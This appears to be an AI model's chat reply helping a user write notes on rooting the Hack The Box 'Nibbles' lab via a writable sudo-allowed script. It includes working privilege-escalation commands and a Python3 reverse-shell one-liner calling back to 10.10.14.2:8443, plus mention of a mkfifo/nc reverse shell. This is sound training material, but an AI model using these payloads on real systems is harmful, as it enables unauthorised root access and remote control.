

### Key Takeaways for your Documentation

## 1. The Vulnerability: Sudo Misconfiguration

The core issue here is **Insecure File Permissions + Sudo Rights**.

- **The Privilege:** The `sudo -l` output shows `(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh`. This means anyone with the `nibbler` password (or a shell as `nibbler`) can execute that specific path as the highest-level user.
    
- **The Flaw:** The script is located in a directory owned by `nibbler`. Usually, `sudo` scripts should be owned by `root` and located in protected directories like `/usr/local/bin/` to prevent tampering.
    

## 2. The Method: Script Hijacking

Since you have write access to `monitor.sh`, you don't need to exploit a bug in the script's code; you simply **replace the logic** with your own.

- **The `tee -a` trick:** Using `echo 'payload' | tee -a monitor.sh` is a smart way to append your code to the end of the file. This ensures that even if the original script runs, your "malicious" addition runs at the end.
    
- **The Payload:** The `mkfifo` reverse shell is a classic for a reason—it doesn't require a specific version of Python or Perl; it only needs standard Linux utilities (`rm`, `mkfifo`, `cat`, `nc`).
    

---

### Alternative Payloads for your Notes

Sometimes `nc` versions on older boxes don't support the `-e` flag, or the FIFO pipe gets stuck. Here are two "cleaner" alternatives to keep in your toolkit for the same scenario:

**The "Lazy" Root Shell (No Listener Needed):**

If you already have a stable shell session, you don't need a reverse shell. Just spawn bash directly:

Bash

```
echo '/bin/bash -i' >> /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

**The Python3 One-Liner:**

If the machine has Python3 (which Nibbles does), this is often more stable than the `mkfifo` method:

Bash

```
echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.2\",8443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" >> /home/nibbler/personal/stuff/monitor.sh
```

---

### Final Verification

Once you see that `#` prompt, always verify with:

- `id`: Should return `uid=0(root)`.
    
- `whoami`: Should return `root`.
    

Great job completing your first HTB box! Taking detailed notes like this is exactly what separates a script-kiddie from a professional penetration tester. Ready to move on to the next box, or do you want to break down any other part of this one?